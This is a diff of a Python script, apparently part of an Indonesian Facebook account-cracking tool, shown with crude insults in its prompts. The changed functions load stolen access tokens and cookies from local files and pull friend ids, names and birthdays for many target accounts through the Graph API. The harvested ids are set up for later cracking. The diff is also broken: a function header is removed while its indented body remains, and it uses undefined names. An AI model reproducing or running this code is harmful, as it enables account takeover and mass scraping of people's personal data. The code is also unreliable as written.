@@ -1063,30 +1063,7 @@ def result():
 		print(' ╰─  Pilih Yang Bener Kontol ')
 		exit()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
-def nge_krek():
-	try:
-		token = open('.token.txt','r').read()
-		kukis = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	pil = input(h+f' • MASUKAN ID : ')
-	try:
-		params = {"access_token": token,"fields": "name,friends.fields(id,name,birthday)"}
-		koH = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],params=params,cookies={'cookie': kukis}).json()
-		for pi in koH['friends']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print(h+f' • TOTAL ID   : {m}'+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(' • Internet Lu Gak Ada Anjing')
-		exit()
-	except (KeyError,IOError):
-		print(' • Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
-		exit()
-#-------------------[ CRACK-PUBLIK ]----------------#
-def dump_massal():
-		token = open('.token.txt','r').read()
+token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 		a = input('╰─  masukan id target: ')
 		try:
@@ -1100,6 +1077,70 @@ def dump_massal():
 			print(' 🔥 : {}'.format(len(id)));setting()
 		except Exception as e:
 		    print (e)
+#-------------------[ CRACK-PUBLIK ]----------------#
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input(h+f' • Mau Berapa Idz Target : '))
+	except ValueError:
+		print(' • Wrong input ')
+		exit()
+	if jum<1 or jum>80:
+		print(h+f'{h} • Pertemanan Tidak Publik  ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(h+f' • Masukan Idz Target Yang Ke '+str(yz)+' : ')
+		uid.append(kl)
+	for userr in uid:
+		try:
+			headers = {
+			"connection": "keep-alive",
+			"accept": "*/*",
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"sec-fetch-user": "?1",
+			"sec-ch-ua-mobile": "?1",
+			"upgrade-insecure-requests": "1",
+			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+			"accept-encoding": "gzip, deflate",
+			"accept-language": "id-ID,id;q=0.9"
+			}
+			params = {
+			"access_token": token,
+			"fields": f"name,friends.fields(id,name,birthday)"
+			}
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(20000)&access_token='+tokenku[0], params=params, headers=headers, cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+					dump(url["friends"]["paging"]["cursors"]["after"])
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print(' • Unstable Signal ')
+			exit()
+	try:
+		print(h+f' • Total Idz Target Yang Terkumpul{x} : {m}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(h+f'{x}')
+		print(' • Unstable Signal ')
+		back()
+	except (KeyError,IOError):
+		print(h+f' • {k} Friendship Not Public {x}')
+		time.sleep(3)
+		back()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	print('')
